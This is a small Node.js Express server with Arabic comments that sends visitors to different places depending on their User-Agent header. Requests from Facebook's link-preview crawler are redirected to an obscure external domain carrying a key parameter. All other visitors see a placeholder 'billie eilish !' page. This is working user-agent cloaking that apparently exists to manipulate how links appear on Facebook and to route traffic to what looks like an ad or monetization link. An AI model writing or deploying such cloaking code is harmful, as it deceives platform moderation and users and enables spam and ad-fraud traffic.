const express = require('express');
const app = express();

// Middleware to handle redirection based on user-agent
app.use((req, res, next) => {
  const userAgent = req.headers['user-agent'];
  console.log('User-Agent:', userAgent); // سجل قيمة user-agent
  
  if (userAgent && userAgent.includes('facebookexternalhit')) {
    console.log('Redirecting to external URL'); // سجل إذا تم تنفيذ إعادة التوجيه
    res.redirect('https://cleopatraadulatefrench.com/yrbajwpw4?key=c13dd6d2f97a5a0f967c85445d720bbb');
  } else {
    next();
  }
});

// Handle other routes
app.get('*', (req, res) => {
  res.send('billie eilish !');
});

// Middleware for handling errors
app.use((err, req, res, next) => {
  console.error('Unhandled error:', err.stack);
  res.status(500).send('Something went wrong!');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});

module.exports = app;
